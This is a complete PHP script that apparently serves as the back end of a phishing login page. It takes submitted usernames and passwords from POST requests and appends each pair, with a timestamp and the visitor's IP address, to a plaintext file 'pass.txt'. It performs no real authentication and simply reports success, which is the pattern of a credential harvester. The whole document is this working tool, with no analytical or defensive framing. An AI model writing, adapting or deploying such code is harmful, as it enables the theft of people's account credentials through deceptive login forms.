<?php
function df($d,$f){
		$myfile = fopen("pass.txt", "a+") or die("Unable to open file!");
		fwrite($myfile,"时间：[".date('Y-m-d H:i:s]',time())."\r\n".getIp()."\r\n"."账号：[".$d."]\r\n"."密码：[".$f."]\r\n"."******************************"."\r\n");
		fclose($myfile);
  }
  function getip(){
if(!empty($_SERVER["HTTP_CLIENT_IP"])){
$cip = $_SERVER["HTTP_CLIENT_IP"];
}
else if(!empty($_SERVER["HTTP_X_FORWARDED_FOR"])){
$cip = $_SERVER["HTTP_X_FORWARDED_FOR"];
}
else if(!empty($_SERVER["REMOTE_ADDR"])){
$cip = $_SERVER["REMOTE_ADDR"];
}
else{
$cip = '';
}
preg_match("/[\d\.]{7,15}/", $cip, $cips);
$cip = isset($cips[0]) ? $cips[0] : 'unknown';
unset($cips);
return $cip;
}

   if ($_POST['user'] != "") {
   	  if ($_POST['pass'] != "") {
   	  	df($_POST['user'],$_POST['pass']);
   	  	echo 'true';
   	  }else{echo '输入密码';}
   }else{echo '输入账号';}
	

#?>